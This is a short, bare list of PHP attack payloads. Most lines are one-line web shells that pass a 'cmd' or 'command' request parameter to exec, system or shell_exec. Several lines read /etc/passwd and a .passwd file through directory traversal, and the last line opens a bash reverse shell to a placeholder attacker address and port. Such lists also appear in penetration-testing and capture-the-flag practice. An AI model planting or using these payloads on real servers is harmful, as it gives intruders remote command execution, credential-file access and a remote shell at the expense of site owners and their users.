##PHP_Payloads

<?php exec($_GET['cmd']); ?>

<?php system($_GET['cmd']); ?>

<?php echo exec($_GET['cmd']); ?>

<?php shell_exec($_GET['cmd']); ?>

<?php system($_GET['command']); ?>

<?php echo system($_GET['cmd']); ?>

<?php shell_exec($_GET['command']); ?>

<?php echo system($_GET['command']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php echo shell_exec($_GET['command']); ?>

<?php echo readfile('../../etc/passwd'); ?>

<?php echo file_get_contents('../../etc/passwd'); ?>

<?php $output = shell_exec('cat ../../../.passwd'); echo "$output";  ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"); ?>
